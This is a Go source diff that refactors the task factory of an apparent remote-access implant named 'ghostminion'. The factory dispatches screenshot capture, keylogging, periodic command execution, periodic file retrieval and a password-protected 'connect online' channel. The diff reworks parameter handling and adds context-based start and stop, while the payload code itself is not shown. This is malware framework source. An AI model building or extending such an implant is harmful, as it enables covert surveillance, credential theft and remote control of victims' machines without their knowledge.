@@ -1,13 +1,10 @@
 package apps
 
 import (
-	"encoding/json"
+	"context"
 	"errors"
 	"ghostminion/logger"
-	"sync"
 )
-
-type AppType string
 
 const (
 	ScreenShotTask    AppType = "screenshot"
@@ -18,68 +15,47 @@ const (
 	ConnectOnlineTask AppType = "connectonline"
 )
 
-type AppData struct {
-	Id     string          `json:"id"`
-	Type   AppType         `json:"type"`
-	Name   string          `json:"name"`
-	Params json.RawMessage `json:"params"`
+var lgr = logger.GetInstance()
+
+type BaseApp struct {
+	stop chan struct{}
+	*AppData
 }
 
+// App is the interface each independent app should implement.
+//
+// Start should be a blocking method that runs until the app naturally exits or the provided context is canceled.
+// The AppManager runs Start in a goroutine and is responsible for wg bookkeeping.
 type App interface {
-	Start(wg *sync.WaitGroup)
-	Stop()
+	Name() string
+	Start(ctx context.Context) error
+	Stop() error
 	validateParams() error
 }
-
-var lgr = logger.GetLogger()
 
 func NewAppFactory(appData AppData) (App, error) {
 	var app App = nil
 	var err error = nil
-	appParams := map[string]any{}
-	if err = json.Unmarshal(appData.Params, &appParams); err != nil {
-		return nil, err
-	}
-
 	switch appData.Type {
 	case ChangeConfigTask:
-		// TODO: change config on demand
-		break
+		lgr.Error("change config not implemented")
 	case ScreenShotTask:
-		app, err = NewScreenshotApp(
-			appParams["Interval"].(int),
-			appParams["Quality"].(int),
-		)
+		app, err = NewScreenshotApp(appData)
 		break
 	case KeyLoggerTask:
-		app, err = NewKeyLoggerApp()
+		app, err = NewKeyLoggerApp(appData)
 		break
 	case CommandTask:
-		app, err = NewPeriodicCommandApp(
-			appParams["Command"].(string),
-			appParams["Interval"].(int),
-			appParams["Timeout"].(int),
-			appParams["MaxRuns"].(int),
-		)
+		app, err = NewPeriodicCommand(appData)
 		break
 	case GetFileTask:
-		app, err = NewPeriodicGetFileApp(
-			appParams["Path"].(string),
-			appParams["MaxSize"].(int),
-			appParams["Interval"].(int),
-			appParams["CheckMD5"].(bool),
-			appParams["MaxRuns"].(int),
-		)
+		app, err = NewPeriodicGetFileApp(appData)
 		break
 	case ConnectOnlineTask:
-		app, err = NewConnectOnlineApp(
-			appParams["Port"].(int),
-			appParams["Password"].(string),
-		)
+		app, err = NewConnectOnlineApp(appData)
 		break
 	default:
 		err = errors.New("unknown app type")
 	}
-
 	return app, err
 }
